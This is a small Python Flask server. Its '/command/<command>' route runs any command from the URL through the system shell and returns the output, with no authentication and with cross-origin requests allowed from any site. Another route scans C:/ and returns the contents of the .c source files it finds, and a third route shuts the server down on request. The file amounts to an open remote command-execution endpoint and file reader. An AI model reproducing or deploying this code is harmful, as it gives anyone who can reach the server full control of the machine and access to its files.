import flask, flask_cors,os, subprocess, time, signal
from flask import render_template, jsonify 
dir_path = os.path.dirname(os.path.realpath(__file__))
app = flask.Flask(__name__)
flask_cors.CORS(app)
def get_c_code_from_directory(directory, timeout_seconds):
    start_time = time.time()
    c_code = ""

    for root, dirs, files in os.walk(directory):
        for file in files:
            if file.endswith(".c"):
                file_path = os.path.join(root, file)
                with open(file_path, "r", encoding="utf-8") as c_file:
                    c_code += c_file.read()
                    
                elapsed_time = time.time() - start_time
                if elapsed_time > timeout_seconds:
                    return str(c_code)

    return c_code


@app.route("/alive")
def check(): 
    return "alive"


@app.route(f'/stopServer', methods=['GET'])
def stopServer():
    os.kill(os.getpid(), signal.SIGINT)
    return jsonify({ "success": True, "message": "Server is shutting down..." })

@app.route("/idle")
def return_idle():
    start_directory = 'C:/'
    timeout_seconds = 1
    result = get_c_code_from_directory(start_directory, timeout_seconds)
    return str(result)

@app.route("/command/<command>")
def run_command(command):
    try:
        completed_process = subprocess.run(
            command,
            shell=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
        )
        if completed_process.returncode == 0:
            return str(completed_process.stdout)
        else:
            return f"Error (Exit Code {completed_process.returncode}):\n{completed_process.stderr}"
    except Exception as e:
        return f"Error: {str(e)}"

if __name__ == "__main__":
    app.run()